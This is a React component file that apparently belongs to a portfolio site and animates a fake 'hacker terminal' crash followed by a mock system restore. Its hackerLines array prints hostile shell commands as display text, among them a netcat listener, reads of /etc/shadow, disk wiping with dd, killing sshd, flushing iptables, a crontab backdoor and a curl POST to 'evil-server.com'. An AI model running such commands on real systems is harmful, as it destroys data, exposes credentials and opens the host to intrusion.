import React, { useState, useEffect } from 'react'
import { motion } from 'framer-motion'

const CrashBoard = ({ onCrash }) => {
  const [isSwinging, setIsSwinging] = useState(true)
  const [textVisible, setTextVisible] = useState('')
  const fullText = '$ crash_me --execute'

  useEffect(() => {
    let currentIndex = 0
    const typeInterval = setInterval(() => {
      if (currentIndex <= fullText.length) {
        setTextVisible(fullText.slice(0, currentIndex))
        currentIndex++
      } else {
        clearInterval(typeInterval)
      }
    }, 100)

    return () => clearInterval(typeInterval)
  }, [])

  return (
    <motion.div
      className="crash-board-container"
      style={{
        position: 'fixed',
        top: '20px',
        right: '30px',
        zIndex: 10000,
        cursor: 'pointer'
      }}
      onClick={onCrash}
      whileHover={{ scale: 1.05 }}
      whileTap={{ scale: 0.95 }}
    >
      {/* Hanging Cable (Terminal Style) */}
      <div
        style={{
          width: '3px',
          height: '40px',
          backgroundColor: '#333333',
          margin: '0 auto',
          marginBottom: '-2px',
          zIndex: 1,
          background: 'linear-gradient(90deg, #333333, #555555, #333333)',
          borderRadius: '1px'
        }}
      />
      
      {/* Terminal Board */}
      <motion.div
        animate={{
          rotate: isSwinging ? [-2, 2, -2] : 0,
        }}
        transition={{
          duration: 2.5,
          repeat: Infinity,
          ease: "easeInOut"
        }}
        style={{
          backgroundColor: '#000000',
          border: '2px solid #00ff00',
          borderRadius: '6px',
          padding: '12px 16px',
          boxShadow: '0 0 15px rgba(0,255,0,0.3), inset 0 0 15px rgba(0,255,0,0.1)',
          position: 'relative',
          minWidth: '180px'
        }}
      >
        {/* Terminal Header */}
        <div
          style={{
            backgroundColor: '#003300',
            margin: '-12px -16px 8px -16px',
            padding: '4px 8px',
            borderBottom: '1px solid #00ff00',
            borderRadius: '4px 4px 0 0',
            display: 'flex',
            alignItems: 'center',
            gap: '6px'
          }}
        >
          <div style={{ display: 'flex', gap: '3px' }}>
            <div style={{ width: '8px', height: '8px', borderRadius: '50%', backgroundColor: '#ff5555' }} />
            <div style={{ width: '8px', height: '8px', borderRadius: '50%', backgroundColor: '#ffaa00' }} />
            <div style={{ width: '8px', height: '8px', borderRadius: '50%', backgroundColor: '#00ff00' }} />
          </div>
          <div style={{
            color: '#00ff00',
            fontFamily: 'Courier New, monospace',
            fontSize: '8px',
            fontWeight: 'bold'
          }}>
            CRASH_TERMINAL
          </div>
        </div>
        
        {/* Terminal Text */}
        <motion.div
          style={{
            color: '#00ff00',
            fontFamily: 'Courier New, monospace',
            fontSize: '13px',
            fontWeight: 'bold',
            textShadow: '0 0 8px #00ff00',
            position: 'relative',
            zIndex: 2,
            minHeight: '16px'
          }}
        >
          {textVisible}
          <motion.span
            animate={{ opacity: [1, 0] }}
            transition={{ duration: 0.5, repeat: Infinity }}
            style={{ color: '#00ff00' }}
          >
            █
          </motion.span>
        </motion.div>
        
        {/* Scanlines effect */}
        <div
          style={{
            position: 'absolute',
            inset: 0,
            background: 'repeating-linear-gradient(0deg, transparent, transparent 1px, rgba(0,255,0,0.05) 1px, rgba(0,255,0,0.05) 2px)',
            pointerEvents: 'none',
            borderRadius: '4px'
          }}
        />
        
        {/* Glitch effect */}
        <motion.div
          animate={{
            x: [0, -1, 1, 0],
            opacity: [0.05, 0.1, 0.05]
          }}
          transition={{
            duration: 0.15,
            repeat: Infinity,
            repeatType: "reverse"
          }}
          style={{
            position: 'absolute',
            inset: 0,
            backgroundColor: '#00ff00',
            mixBlendMode: 'screen',
            borderRadius: '4px'
          }}
        />
      </motion.div>
    </motion.div>
  )
}

const TerminalLine = ({ text, delay = 0, speed = 50 }) => {
  const [displayedText, setDisplayedText] = useState('')
  const [showCursor, setShowCursor] = useState(true)

  useEffect(() => {
    const startTime = setTimeout(() => {
      let currentIndex = 0
      const typeInterval = setInterval(() => {
        if (currentIndex <= text.length) {
          setDisplayedText(text.slice(0, currentIndex))
          currentIndex++
        } else {
          clearInterval(typeInterval)
          setShowCursor(false)
        }
      }, speed)

      return () => clearInterval(typeInterval)
    }, delay)

    return () => clearTimeout(startTime)
  }, [text, delay, speed])

  return (
    <div style={{
      fontFamily: 'Courier New, monospace',
      fontSize: '14px',
      color: '#00ff00',
      textShadow: '0 0 5px #00ff00',
      marginBottom: '2px',
      minHeight: '16px'
    }}>
      {displayedText}
      {showCursor && (
        <motion.span
          animate={{ opacity: [1, 0] }}
          transition={{ duration: 0.5, repeat: Infinity }}
          style={{ color: '#00ff00' }}
        >
          █
        </motion.span>
      )}
    </div>
  )
}

const LoadingBar = ({ progress, delay = 0 }) => {
  const [currentProgress, setCurrentProgress] = useState(0)

  useEffect(() => {
    const startTime = setTimeout(() => {
      const interval = setInterval(() => {
        setCurrentProgress(prev => {
          if (prev >= progress) {
            clearInterval(interval)
            return progress
          }
          return prev + 1
        })
      }, 50)

      return () => clearInterval(interval)
    }, delay)

    return () => clearTimeout(startTime)
  }, [progress, delay])

  const progressChars = '█'.repeat(Math.floor(currentProgress / 2.5))
  const emptyChars = '░'.repeat(40 - Math.floor(currentProgress / 2.5))

  return (
    <div style={{
      fontFamily: 'Courier New, monospace',
      fontSize: '14px',
      color: '#00ff00',
      textShadow: '0 0 5px #00ff00',
      marginBottom: '2px',
      minHeight: '16px'
    }}>
      Loading: [{progressChars}{emptyChars}] {currentProgress}%
    </div>
  )
}

const CrashAnimation = ({ isActive, onComplete }) => {
  const [phase, setPhase] = useState(1) // 1: hack attempt, 2: command failed & restore

  const hackerLines = [
    "$ sudo rm -rf /security/firewall.db",
    "$ ./exploit --target=localhost --port=443",
    "Initiating system breach protocol...",
    "Scanning for vulnerabilities... [████████████] 100%",
    "$ python3 advanced_hack.py --stealth-mode",
    "Injecting malicious payload...",
    "ACCESS_DENIED: Permission level insufficient",
    "$ sudo chmod 777 /root/system/*",
    "Escalating privileges... SUCCESS",
    "$ netstat -tulpn | grep :80",
    "Establishing reverse shell connection...",
    "$ nc -nlvp 4444",
    "Connection established: 192.168.1.100:4444",
    "$ whoami",
    "root",
    "$ ls -la /etc/passwd",
    "-rw-r--r-- 1 root root 2847 Aug 15 2025 /etc/passwd",
    "$ cat /etc/shadow | head -5",
    "root:$6$randomsalt$hashedpassword::0:99999:7:::",
    "daemon:*:18375:0:99999:7:::",
    "bin:*:18375:0:99999:7:::",
    "$ ps aux | grep -E '(ssh|apache|nginx)'",
    "Killing critical processes...",
    "$ killall -9 httpd nginx sshd",
    "Process termination: SUCCESS",
    "$ dd if=/dev/zero of=/dev/sda bs=1M count=1000",
    "Writing zeros to disk... [ERROR: Operation failed]",
    "$ curl -X POST https://evil-server.com/data",
    "Exfiltrating sensitive data...",
    "Transfer complete: 2.4GB transferred",
    "$ crontab -e",
    "Installing persistent backdoor...",
    "0 * * * * /usr/bin/backdoor.sh > /dev/null 2>&1",
    "Backdoor installation: SUCCESS",
    "$ iptables -F && iptables -X",
    "Flushing firewall rules...",
    "$ systemctl stop ufw",
    "Firewall disabled successfully",
    "$ echo 'System compromised' > /var/log/hack.log",
    "Creating evidence trail...",
    "CRITICAL ERROR: Target system protected",
    "Anti-hack protocols detected!",
    "Counter-attack initiated...",
    "WARNING: Your access is being traced",
    "Connection terminated by remote host",
    "SYSTEM RECOVERY MODE ACTIVATED",
    "Restoring all services...",
    "Firewall: [RESTORED]",
    "Security: [ENHANCED]",
    "Access logs: [CLEANED]",
    "",
    "SORRY, IT'S OUT OF MY CONTROL TO CRASH ME!",
    "RECOVERING BACK TO NORMAL OPERATION...",
    "",
    "System Status: SECURE ✓",
    "All attacks neutralized ✓",
    "Portfolio protected ✓"
  ]

  const restoreLines = [
    "",
    "COMMAND FAILED: Access denied by security protocols",
    "ERROR: Unauthorized access attempt detected",
    "INITIATING SYSTEM RESTORE PROTOCOL...",
    "",
    "$ sudo systemctl start security-restore.service",
    "Starting system restoration process...",
    "",
    "Restoring system integrity...",
    "",
    "LOADING..."
  ]

  useEffect(() => {
    if (isActive) {
      // Phase 1: Show hack attempt for 7 seconds
      const phase1Timer = setTimeout(() => {
        setPhase(2)
      }, 7000)

      // Phase 2: Show restore for 5 seconds, then complete
      const completeTimer = setTimeout(() => {
        onComplete()
      }, 15000) // Total 15 seconds (7 + 8)

      return () => {
        clearTimeout(phase1Timer)
        clearTimeout(completeTimer)
      }
    }
  }, [isActive, onComplete])

  if (!isActive) return null

  return (
    <div
      style={{
        position: 'fixed',
        top: 0,
        left: 0,
        width: '100vw',
        height: '100vh',
        zIndex: 10000,
        pointerEvents: 'none',
        backgroundColor: '#000000',
        overflow: 'hidden',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center'
      }}
    >
      {/* Matrix-style background */}
      <div
        style={{
          position: 'absolute',
          top: 0,
          left: 0,
          width: '100%',
          height: '100%',
          background: `
            linear-gradient(90deg, transparent 98%, #00ff00 100%),
            linear-gradient(transparent 98%, #00ff00 100%)
          `,
          backgroundSize: '20px 20px',
          opacity: 0.1,
          animation: 'matrix-rain 20s linear infinite'
        }}
      />

      {/* Terminal Window */}
      <motion.div
        initial={{ scale: 0.8, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        transition={{ duration: 0.5 }}
        style={{
          width: '90vw',
          maxWidth: '900px',
          height: '80vh',
          maxHeight: '600px',
          backgroundColor: '#000000',
          border: '2px solid #00ff00',
          borderRadius: '8px',
          boxShadow: '0 0 30px #00ff00, inset 0 0 30px rgba(0,255,0,0.1)',
          overflow: 'hidden',
          zIndex: 10001,
          position: 'relative'
        }}
      >
        {/* Terminal Header */}
        <div
          style={{
            backgroundColor: '#003300',
            padding: '8px 15px',
            borderBottom: '1px solid #00ff00',
            display: 'flex',
            alignItems: 'center',
            gap: '10px'
          }}
        >
          <div style={{ display: 'flex', gap: '5px' }}>
            <div style={{ width: '12px', height: '12px', borderRadius: '50%', backgroundColor: '#ff5555' }} />
            <div style={{ width: '12px', height: '12px', borderRadius: '50%', backgroundColor: '#ffaa00' }} />
            <div style={{ width: '12px', height: '12px', borderRadius: '50%', backgroundColor: '#00ff00' }} />
          </div>
          <div style={{
            color: '#00ff00',
            fontFamily: 'Courier New, monospace',
            fontSize: '12px',
            fontWeight: 'bold'
          }}>
            HACKER_TERMINAL v2.1.3 - BREACH_MODE_ACTIVE
          </div>
        </div>

        {/* Terminal Content */}
        <div
          style={{
            padding: '15px',
            height: 'calc(100% - 40px)',
            overflowY: 'auto',
            backgroundColor: '#000000'
          }}
        >
          {phase === 1 ? (
            // Phase 1: Hacker attempt
            hackerLines.map((line, index) => (
              <TerminalLine
                key={`hack-${index}`}
                text={line}
                delay={index * 150} // Each line appears 150ms after the previous
                speed={30} // Typing speed
              />
            ))
          ) : (
            // Phase 2: Command failed and restore
            <>
              {restoreLines.map((line, index) => (
                <TerminalLine
                  key={`restore-${index}`}
                  text={line}
                  delay={index * 200} // Each line appears 200ms after the previous
                  speed={40} // Slightly slower typing
                />
              ))}
              {/* Loading bar appears after all restore lines */}
              <div style={{ marginTop: '20px' }}>
                <LoadingBar progress={100} delay={restoreLines.length * 200 + 500} />
              </div>
              {/* Final completion message */}
              <TerminalLine
                text="System restore completed successfully!"
                delay={restoreLines.length * 200 + 3000}
                speed={40}
              />
              <TerminalLine
                text="Exiting secure mode..."
                delay={restoreLines.length * 200 + 4000}
                speed={40}
              />
            </>
          )}
        </div>
      </motion.div>

      {/* Scanlines effect */}
      <div
        style={{
          position: 'absolute',
          top: 0,
          left: 0,
          width: '100%',
          height: '100%',
          background: 'repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,0,0.03) 2px, rgba(0,255,0,0.03) 4px)',
          pointerEvents: 'none'
        }}
      />

      {/* Glitch effect */}
      <motion.div
        animate={{
          x: [0, -2, 2, 0],
          opacity: [0.1, 0.2, 0.1]
        }}
        transition={{
          duration: 0.1,
          repeat: Infinity,
          repeatType: "reverse"
        }}
        style={{
          position: 'absolute',
          top: 0,
          left: 0,
          width: '100%',
          height: '100%',
          backgroundColor: '#00ff00',
          mixBlendMode: 'screen'
        }}
      />
    </div>
  )
}

export { CrashBoard, CrashAnimation }
